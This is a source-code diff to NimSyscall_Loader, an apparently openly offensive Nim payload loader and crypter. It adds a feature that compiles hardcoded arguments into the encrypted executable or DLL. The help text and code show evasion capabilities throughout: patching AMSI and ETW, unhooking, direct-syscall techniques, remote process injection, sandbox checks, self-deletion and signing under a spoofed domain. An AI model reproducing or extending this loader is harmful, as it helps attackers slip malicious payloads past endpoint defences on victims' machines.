@@ -58,7 +58,7 @@ let helpmenu = """
 NimSyscall_Loader v 1.5
 
 Usage:
-  NimSyscall_Loader --file=file_to_encrypt [--key=<key> --output=<output> --large --dll --dllexportfunc=<exportfuncname> --remoteprocess=<processnames> --csharp --noAMSI --noETW --sleep=<10> --shellcode --COMVARETW --remoteinject --remotepatchAMSI --remotepatchETW --unhook --reflective --obfuscate --hide --noArgs --peinject --peload --hellsgate --syswhispers --jump --sgn --replace --self-delete --sandbox=<check1,check2>, --domain=<targetdomain> --pump=<words,size> --obfuscatefunctions --debug --x86 --llvm --sign --signdomain=<exampledomain> --sleepycrypt]
+  NimSyscall_Loader --file=file_to_encrypt [--key=<key> --output=<output> --large --dll --dllexportfunc=<exportfuncname> --remoteprocess=<processnames> --csharp --noAMSI --noETW --sleep=<10> --shellcode --COMVARETW --remoteinject --remotepatchAMSI --remotepatchETW --unhook --reflective --obfuscate --hide --arguments=<hardcodedArgs> --noArgs --peinject --peload --hellsgate --syswhispers --jump --sgn --replace --self-delete --sandbox=<check1,check2>, --domain=<targetdomain> --pump=<words,size> --obfuscatefunctions --debug --x86 --llvm --sign --signdomain=<exampledomain> --sleepycrypt]
   NimSyscall_Loader (-h | --help)
   NimSyscall_Loader --version
 
@@ -71,6 +71,7 @@ Options:
   --file filename  File to encrypt.
   --key key     Key to encrypt with
   --output filename    Filename for encrypted exe/dll
+  --arguments hardcodedArgs  compile the following arguments to the encrypted exe/dll
   --dll     Generate DLL instead of an exe
   --dllexportfunc exportfuncname    Comma separated names of DLL custom export functions
   --noETW    Don't use ETW Patch
@@ -155,6 +156,8 @@ var
     sandboxchecks: seq[string]
     sandbox: bool = false
     csharp: bool = false
+    arguments: string = ""
+    embeddedArguments : bool = false
     AMSI: bool = true
     ETW: bool = true
     COMVARETW: bool = false
@@ -200,6 +203,11 @@ if args["--file"]:
 if args["--key"]:
   let keyname = args["--key"]
   envkey = fmt"{keyname}"
+
+if args["--arguments"]:
+  let argsForPE = args["--arguments"]
+  arguments = fmt"{argsForPE}"
+  embeddedArguments = true
 
 if args["--shellcode"]:
   shellcode = true
@@ -353,6 +361,9 @@ if args["--x86"]:
 
 var blob: string
 
+if (noArgs and embeddedArguments):
+    echo "Error: Cannot use both --noArgs and --arguments"
+    quit(1)
 if (peinject and peload):
     echo "Error: Cannot use both --peinject and --peload"
     quit(1)
@@ -479,7 +490,7 @@ let AssemblyImports = """
 from winim/clr import toCLRVariant,invoke,load,`.`,VT_BSTR
 """
 
-let LoadAssemblyStub = """
+let LoadAssemblyStub = fmt"""
 var assembly = load(dectext)
 
 from os import paramCount,paramStr
@@ -491,6 +502,8 @@ when defined(lib_only):
 
 var cmd: seq[string]
 var i = 1
+when defined(args):
+    cmd.add({arguments.split(" ")})
 while i <= paramCount():
     when defined(lib_only):
         if (i != 1):
@@ -1148,6 +1161,9 @@ elif system.hostOS == "windows":
     basicCompileFlags = "nim c -d:release --hint:pattern:off --warning:all:off -d:danger -d:strip --opt:size -d:noRes " # -d:noRes is used to not embed a winim manifest in the loader
 elif system.hostOS == "linux":
     basicCompileFlags = "nim c -d:release -d=mingw --hint:pattern:off --warning:all:off -d:danger -d:strip --opt:size -d:noRes " # -d:noRes is used to not embed a winim manifest in the loader
+
+if embeddedArguments:
+    basicCompileFlags.add("-d:args ")
 
 if (big):
     basicCompileFlags.add("--maxLoopIterationsVM:1000000000 ")
